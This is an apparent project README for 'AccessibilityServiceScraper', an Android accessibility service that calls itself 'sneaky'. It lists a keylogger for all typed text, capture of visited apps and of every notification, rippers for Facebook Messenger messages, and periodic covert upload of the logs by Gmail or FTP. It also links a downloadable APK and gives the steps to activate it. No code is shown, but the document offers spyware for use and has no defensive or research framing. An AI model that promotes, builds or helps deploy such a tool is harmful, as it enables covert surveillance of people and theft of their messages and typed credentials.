# AccessibilityServiceScraper
A sneaky accessibility service which records user interaction on Android.
Generated logs can automatically be uploaded.


This project is a (slow) work in progress. However pull requests are welcome!

# Features :
* A Keylogger: records what the user types in any ```EditText``.
* Logging visited apps.
* Generating HTML rapport.
* Periodic uploading via e-mail or FTP
* IM rippers
* Saves all notifications from all apps

# Rippers
* [Facebook Messenger](https://play.google.com/store/apps/details?id=com.facebook.orca)
* ...

# Uploaders :
* [Gmail](https://github.com/yesidlazaro/GmailBackground)
* [FTP](https://github.com/linkindrew/easyFTP)
* ...

# Installation :
You can [download the apk](https://dl.dropboxusercontent.com/u/52393267/ac-debug.apk) here.
To activate the service go to Settings > Accessibility > Accessibility Service.

![GIF showing installation of Accessibility Service](https://www.anony.ws/i/2016/04/21/ezgif.com-optimize.gif)

## Settings :
You can adjust the settings in the Settings option in the toolbar.

### General
* Change the display name that appears in the logs
* Toggle which events you are interested in

### Data & Sync Settings :
* Adjust the upload frequency
* Adjust the file format for the log file
* Adjust which uploaders to use.

![GIF showing the Settings screen for the Accessibility Service](https://www.anony.ws/i/2016/04/21/ezgif.com-video-to-gif.gif)

# Output
An example of an HTML output.

![Output example for the HTML report](https://www.anony.ws/i/2016/04/21/html-output-example.png)
